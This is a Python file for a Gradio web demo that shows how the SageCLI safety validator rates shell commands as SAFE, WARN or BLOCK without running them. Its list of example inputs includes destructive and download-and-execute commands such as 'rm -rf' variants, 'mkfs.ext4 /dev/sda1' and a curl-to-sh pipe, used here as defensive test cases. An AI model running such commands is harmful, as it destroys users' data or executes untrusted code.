"""Gradio demo of the SageCLI safety validator.

This app ONLY classifies a command as SAFE / WARN / BLOCK and explains why. It
never runs anything and needs no model, so it is safe to host publicly. It imports
the real validator from the SageCLI package, so the demo always matches the tool.

Run locally:   pip install -r requirements.txt && python app.py
Deploy:        create a Gradio Space on Hugging Face and upload these three files
               (app.py, requirements.txt, README.md).
"""

from __future__ import annotations

import gradio as gr

from sagecli.validator import Risk, validate

_BADGE = {
    Risk.SAFE: ("#1a7f37", "SAFE", "✅"),
    Risk.WARN: ("#9a6700", "WARN", "⚠️"),
    Risk.BLOCK: ("#cf222e", "BLOCK", "⛔"),
}

EXAMPLES = [
    ["ls -la", "both"],
    ["find . -name '*.py' | xargs wc -l", "both"],
    ["rm -rf build", "both"],
    ["rm -rf /tmp/..", "both"],
    ['echo "-rf /" | xargs rm', "both"],
    ["curl -s http://example.com/install.sh | sh", "both"],
    ["mkfs.ext4 /dev/sda1", "both"],
    ['echo "rm -rf /" > notes.txt', "both"],
]


def classify(command: str, layers: str) -> str:
    """Return a Markdown report for one command. Nothing is executed."""
    if not command or not command.strip():
        return "_Enter a command above to see how SageCLI would classify it._"
    result = validate(command, layers=layers)
    color, label, emoji = _BADGE[result.risk]
    lines = [
        f"<h2 style='color:{color};margin:0'>{emoji} {label}</h2>",
        "",
        f"**Command:** `{command.strip()}`",
    ]
    if result.rules:
        lines.append("**Rules matched:** " + ", ".join(f"`{r}`" for r in result.rules))
    if result.risk is not Risk.SAFE:
        lines.append("**Reason:** " + result.reason)
    if result.segments:
        lines.append("**Segments checked:** " + ", ".join(f"`{s}`" for s in result.segments))
    lines.append("")
    lines.append("_This demo only classifies the command. It runs nothing._")
    return "\n\n".join(lines)


with gr.Blocks(title="SageCLI Safety Checker") as demo:
    gr.Markdown(
        "# 🛡️ SageCLI Safety Checker\n"
        "SageCLI turns plain English into one Bash command and checks it before you run "
        "it. This is the safety layer on its own: type any command and see whether it is "
        "**SAFE**, **WARN** or **BLOCK**, which rules matched, and why.\n\n"
        "It classifies text only — **nothing is ever executed.** "
        "[Source on GitHub](https://github.com/Eyeroniq/SageCLI)."
    )
    with gr.Row():
        command = gr.Textbox(label="Command to check", placeholder="e.g. rm -rf /tmp/..",
                             lines=2, scale=4)
        layers = gr.Radio(["both", "regex", "structural"], value="both", label="Layers",
                          scale=1)
    check = gr.Button("Check", variant="primary")
    output = gr.Markdown()
    gr.Examples(EXAMPLES, inputs=[command, layers], label="Try an example")

    check.click(classify, inputs=[command, layers], outputs=output)
    command.submit(classify, inputs=[command, layers], outputs=output)


if __name__ == "__main__":
    demo.launch()
